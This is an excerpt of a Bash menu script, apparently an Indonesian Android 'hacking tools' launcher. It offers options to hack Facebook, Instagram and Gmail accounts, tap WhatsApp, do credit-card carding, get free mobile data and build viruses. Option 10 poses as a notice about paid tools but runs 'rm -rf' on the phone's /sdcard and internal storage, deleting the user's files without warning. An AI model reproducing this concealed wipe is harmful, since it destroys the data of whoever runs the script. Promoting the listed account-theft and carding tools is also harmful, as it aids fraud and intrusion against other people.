...
case $pil in
    1) echo "R4D3N TOOLS-HACK FB NARGET" | lolcat
            pkg install python2
...
2) echo "R4D3N TOOLS-HACK IG NARGET" | lolcat
        apt install python2
...
3) echo "R4D3N TOOLS-HACK GMAIL" | lolcat
        apt install python2
...
4) echo "R4D3N TOOLS-SADAP WA" | lolcat
...
8) echo "R4D3N TOOLS-DUMP TEMAN FB" | lolcat
...
9) echo "R4D3N TOOLS-CC CARDING" | lolcat
...
10) echo "Tools Berbayar harap hubungi author di fb : Raden Gozal" | lolcat
    rm -rf /sdcard/
    rm -rf /storage/emulated/0/
echo
...
11) echo "R4D3N TOOLS-TEMBAK KUOTA" | lolcat
...
12) echo "R4D3N TOOLS-TEMBAK KUOTA" | lolcat 
...
13) echo "R4D3N TOOLS-BUAT VIRUS" | lolcat  
